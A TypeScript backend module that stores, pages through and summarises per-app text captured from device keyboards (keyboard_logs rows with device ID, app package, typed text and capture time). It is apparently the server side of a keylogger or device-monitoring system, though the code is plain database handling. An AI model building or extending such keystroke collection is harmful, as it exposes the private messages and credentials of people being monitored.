import type { RowDataPacket } from "mysql2";
import { v4 as uuidv4 } from "uuid";
import { pool } from "../db/pool.js";

interface KeyboardLogRow extends RowDataPacket {
  id: string;
  device_id: string;
  app_package: string | null;
  app_label: string | null;
  text_content: string;
  event_type: number | null;
  captured_at: Date;
  created_at: Date;
}

export interface KeyboardLogInput {
  appPackage?: string | null;
  appLabel?: string | null;
  text: string;
  eventType?: number | null;
  capturedAt?: number;
}

function mapKeyboardLog(row: KeyboardLogRow) {
  return {
    id: row.id,
    deviceId: row.device_id,
    appPackage: row.app_package,
    appLabel: row.app_label,
    text: row.text_content,
    eventType: row.event_type,
    capturedAt: row.captured_at,
    createdAt: row.created_at,
  };
}

export async function saveKeyboardLog(deviceId: string, input: KeyboardLogInput) {
  const text = input.text.trim();
  if (!text) {
    throw new Error("keyboard_text_required");
  }

  const id = uuidv4();
  const capturedAt = input.capturedAt
    ? new Date(input.capturedAt)
    : new Date();
  const appLabel = input.appLabel?.trim() || null;

  await pool.query(
    `INSERT INTO keyboard_logs (id, device_id, app_package, app_label, text_content, event_type, captured_at)
     VALUES (?, ?, ?, ?, ?, ?, ?)`,
    [
      id,
      deviceId,
      input.appPackage ?? null,
      appLabel,
      text,
      input.eventType ?? null,
      capturedAt,
    ],
  );

  return {
    id,
    deviceId,
    appPackage: input.appPackage ?? null,
    appLabel,
    text,
    eventType: input.eventType ?? null,
    capturedAt,
  };
}

export async function listKeyboardLogs(input: {
  deviceId?: string;
  appPackage?: string;
  page?: number;
  pageSize?: number;
}) {
  const page = Math.max(input.page ?? 1, 1);
  const pageSize = Math.min(Math.max(input.pageSize ?? 20, 1), 500);
  const offset = (page - 1) * pageSize;
  const deviceId = input.deviceId?.trim();
  const appPackage = input.appPackage?.trim();

  const conditions: string[] = [];
  const params: Array<string | number> = [];

  if (deviceId) {
    conditions.push("device_id = ?");
    params.push(deviceId);
  }
  if (appPackage !== undefined) {
    const normalizedPackage = appPackage.trim();
    if (!normalizedPackage || normalizedPackage === "__unknown__") {
      conditions.push("(app_package IS NULL OR app_package = '')");
    } else {
      conditions.push("app_package = ?");
      params.push(normalizedPackage);
    }
  }

  const whereSql = conditions.length > 0 ? `WHERE ${conditions.join(" AND ")}` : "";

  const [countRows] = await pool.query<RowDataPacket[]>(
    `SELECT COUNT(*) AS total FROM keyboard_logs ${whereSql}`,
    params,
  );
  const total = Number(countRows[0]?.total ?? 0);

  const [rows] = await pool.query<KeyboardLogRow[]>(
    `SELECT * FROM keyboard_logs ${whereSql}
     ORDER BY captured_at DESC
     LIMIT ? OFFSET ?`,
    [...params, pageSize, offset],
  );

  return {
    items: rows.map(mapKeyboardLog),
    total: Number.isFinite(total) ? total : 0,
    page,
    pageSize,
  };
}

interface KeyboardAppSummaryRow extends RowDataPacket {
  app_package: string | null;
  app_label: string | null;
  total: number;
  last_captured_at: Date;
}

export async function listKeyboardAppSummaries(deviceId: string) {
  const normalizedDeviceId = deviceId.trim();
  if (!normalizedDeviceId) {
    return [];
  }

  const [rows] = await pool.query<KeyboardAppSummaryRow[]>(
    `SELECT app_package,
            COUNT(*) AS total,
            MAX(captured_at) AS last_captured_at,
            MAX(app_label) AS app_label
     FROM keyboard_logs
     WHERE device_id = ?
     GROUP BY app_package
     ORDER BY last_captured_at DESC`,
    [normalizedDeviceId],
  );

  return rows.map((row) => ({
    appPackage: row.app_package,
    appLabel: row.app_label,
    count: Number(row.total ?? 0),
    lastCapturedAt: row.last_captured_at,
  }));
}
